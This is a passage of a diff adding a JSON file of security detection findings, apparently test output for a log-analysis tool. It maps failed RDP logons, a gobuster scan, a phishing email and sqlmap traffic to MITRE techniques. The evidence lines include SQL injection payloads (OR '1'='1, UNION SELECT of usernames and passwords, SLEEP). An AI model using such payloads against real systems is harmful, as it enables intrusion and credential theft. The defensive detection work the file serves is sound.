+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:20:09.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4625,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TargetUserName\u0022:\u0022Administrator\u0022,\u0022IpAddress\u0022:\u0022203.0.113.80\u0022,\u0022LogonType\u0022:\u002210\u0022,\u0022WorkstationName\u0022:\u0022kali\u0022}}}",
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:20:13.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4625,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TargetUserName\u0022:\u0022Administrator\u0022,\u0022IpAddress\u0022:\u0022203.0.113.80\u0022,\u0022LogonType\u0022:\u002210\u0022,\u0022WorkstationName\u0022:\u0022kali\u0022}}}",
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:20:18.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4625,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TargetUserName\u0022:\u0022Administrator\u0022,\u0022IpAddress\u0022:\u0022203.0.113.80\u0022,\u0022LogonType\u0022:\u002210\u0022,\u0022WorkstationName\u0022:\u0022kali\u0022}}}"
+    ]
+  },
+  {
+    "ruleId": "LS-WEB-003",
+    "title": "Directory / content discovery scan",
+    "severity": "Medium",
+    "technique": {
+      "id": "T1595.003",
+      "name": "Active Scanning: Wordlist Scanning",
+      "tactic": "Reconnaissance",
+      "url": "https://attack.mitre.org/techniques/T1595/003/"
+    },
+    "description": "203.0.113.45 triggered 144 HTTP 404 responses (3.6/s).",
+    "sourceIp": "203.0.113.45",
+    "user": null,
+    "host": null,
+    "firstSeen": "2026-10-31T10:00:00+00:00",
+    "lastSeen": "2026-10-31T10:00:40+00:00",
+    "eventCount": 144,
+    "evidence": [
+      "203.0.113.45 - - [31/Oct/2026:10:00:00 \u002B0000] \u0022GET /admin0 HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022",
+      "203.0.113.45 - - [31/Oct/2026:10:00:00 \u002B0000] \u0022GET /backup1 HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022",
+      "203.0.113.45 - - [31/Oct/2026:10:00:00 \u002B0000] \u0022GET /old2 HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022",
+      "203.0.113.45 - - [31/Oct/2026:10:00:01 \u002B0000] \u0022GET /test3 HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022",
+      "203.0.113.45 - - [31/Oct/2026:10:00:01 \u002B0000] \u0022GET /dev4 HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022"
+    ]
+  },
+  {
+    "ruleId": "LS-WEB-004",
+    "title": "Attack tool detected: gobuster",
+    "severity": "Medium",
+    "technique": {
+      "id": "T1595.002",
+      "name": "Active Scanning: Vulnerability Scanning",
+      "tactic": "Reconnaissance",
+      "url": "https://attack.mitre.org/techniques/T1595/002/"
+    },
+    "description": "203.0.113.45 sent 145 request(s) identifying as \u0027gobuster\u0027.",
+    "sourceIp": "203.0.113.45",
+    "user": null,
+    "host": null,
+    "firstSeen": "2026-10-31T10:00:00+00:00",
+    "lastSeen": "2026-10-31T10:00:40+00:00",
+    "eventCount": 145,
+    "evidence": [
+      "203.0.113.45 - - [31/Oct/2026:10:00:00 \u002B0000] \u0022GET /admin0 HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022",
+      "203.0.113.45 - - [31/Oct/2026:10:00:00 \u002B0000] \u0022GET /backup1 HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022",
+      "203.0.113.45 - - [31/Oct/2026:10:00:00 \u002B0000] \u0022GET /old2 HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022"
+    ]
+  },
+  {
+    "ruleId": "LS-MAIL-001",
+    "title": "Phishing delivered to lena@example.de",
+    "severity": "Medium",
+    "technique": {
+      "id": "T1566",
+      "name": "Phishing",
+      "tactic": "Initial Access",
+      "url": "https://attack.mitre.org/techniques/T1566/"
+    },
+    "description": "PhishLens judged \u0022Passwort l\u00E4uft heute ab\u0022 from it-service@examp1e-bank.example as LikelyPhishing. Find the other recipients, remove the message, block the indicators, and check whether anyone clicked.",
+    "sourceIp": "198.51.100.140",
+    "user": "lena@example.de",
+    "host": null,
+    "firstSeen": "2026-10-31T10:02:00+00:00",
+    "lastSeen": "2026-10-31T10:02:00+00:00",
+    "eventCount": 1,
+    "evidence": [
+      "{\u0022timestamp\u0022:\u00222026-10-31T10:02:00Z\u0022,\u0022source\u0022:\u0022phishlens\u0022,\u0022type\u0022:\u0022email.analyzed\u0022,\u0022verdict\u0022:\u0022LikelyPhishing\u0022,\u0022score\u0022:0,\u0022recipient\u0022:\u0022lena@example.de\u0022,\u0022sender\u0022:\u0022it-service@examp1e-bank.example\u0022,\u0022subject\u0022:\u0022Passwort l\\u00E4uft heute ab\u0022,\u0022originIp\u0022:\u0022198.51.100.140\u0022}"
+    ]
+  },
+  {
+    "ruleId": "LS-WEB-004",
+    "title": "Attack tool detected: sqlmap",
+    "severity": "Medium",
+    "technique": {
+      "id": "T1595.002",
+      "name": "Active Scanning: Vulnerability Scanning",
+      "tactic": "Reconnaissance",
+      "url": "https://attack.mitre.org/techniques/T1595/002/"
+    },
+    "description": "192.0.2.150 sent 24 request(s) identifying as \u0027sqlmap\u0027.",
+    "sourceIp": "192.0.2.150",
+    "user": null,
+    "host": null,
+    "firstSeen": "2026-10-31T11:12:01+00:00",
+    "lastSeen": "2026-10-31T11:12:38+00:00",
+    "eventCount": 24,
+    "evidence": [
+      "192.0.2.150 - - [31/Oct/2026:11:12:01 \u002B0000] \u0022GET /products?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1\u0022 500 162 \u0022-\u0022 \u0022sqlmap/1.8.4#stable (https://sqlmap.org)\u0022",
+      "192.0.2.150 - - [31/Oct/2026:11:12:02 \u002B0000] \u0022GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\u0022 403 162 \u0022-\u0022 \u0022sqlmap/1.8.4#stable (https://sqlmap.org)\u0022",
+      "192.0.2.150 - - [31/Oct/2026:11:12:04 \u002B0000] \u0022GET /products?id=1%27%20AND%20SLEEP(5)-- HTTP/1.1\u0022 403 162 \u0022-\u0022 \u0022sqlmap/1.8.4#stable (https://sqlmap.org)\u0022"
+    ]
+  }
+]
